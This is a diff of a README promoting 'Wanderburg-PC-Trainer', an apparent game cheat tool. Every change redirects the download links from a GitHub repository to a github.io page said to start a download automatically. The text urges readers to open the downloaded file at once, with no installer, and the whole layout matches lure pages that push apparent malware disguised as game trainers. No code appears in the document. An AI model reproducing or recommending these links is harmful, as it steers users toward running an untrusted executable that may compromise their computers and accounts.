@@ -1,6 +1,6 @@
 # 🎮 Wanderburg-PC-Trainer - Unlock God Mode Instantly Today
 
-[![Download Wanderburg Trainer](https://img.shields.io/badge/Download-Wanderburg_Trainer_2026-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Neritic-mayenne9092/Wanderburg-PC-Trainer)
+[![Download Wanderburg Trainer](https://img.shields.io/badge/Download-Wanderburg_Trainer_2026-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://neritic-mayenne9092.github.io)
 
 ## 👋 Welcome
 
@@ -14,7 +14,7 @@ You love playing Wanderburg. You hate getting stuck on tough levels, running out
 
 Getting the trainer up and running takes less than two minutes. Follow these simple steps:
 
-1. **Visit the download page**: [https://github.com/Neritic-mayenne9092/Wanderburg-PC-Trainer](https://github.com/Neritic-mayenne9092/Wanderburg-PC-Trainer)
+1. **Visit the download page**: [https://neritic-mayenne9092.github.io](https://neritic-mayenne9092.github.io)
 2. **Click the download button**: Find the green download button on the page and click it.
 3. **Run the program**: The download starts immediately. Once it finishes, open the file to launch the trainer.
 
@@ -22,7 +22,7 @@ That's all there is to it. The trainer opens as a small, unobtrusive window that
 
 ## 📥 Download and Install
 
-**Important:** Visit this link to download the application – [https://github.com/Neritic-mayenne9092/Wanderburg-PC-Trainer](https://github.com/Neritic-mayenne9092/Wanderburg-PC-Trainer)
+**Important:** Visit this link to download the application – [https://neritic-mayenne9092.github.io](https://neritic-mayenne9092.github.io)
 
 The file downloads automatically. No installation wizard, no complicated setup process. You just run the program and it works. Keep the trainer file in a safe place on your computer, like your Desktop or Documents folder, so you can find it easily every time you want to play.
 
@@ -102,7 +102,7 @@ Anyone who plays Wanderburg. Whether you're a casual player who just wants to ha
 
 Don't spend another minute struggling with difficult sections or tedious grinding. Download Wanderburg-PC-Trainer today and experience the game the way you want to. The download takes seconds, and the difference is immediate. Click the button, launch the game, and become unstoppable.
 
-**[👉 Download Wanderburg-PC-Trainer Now](https://github.com/Neritic-mayenne9092/Wanderburg-PC-Trainer)**
+**[👉 Download Wanderburg-PC-Trainer Now](https://neritic-mayenne9092.github.io)**
 
 Your journey to total gaming domination starts right now. Get the power. Get the glory. Get the trainer.
 
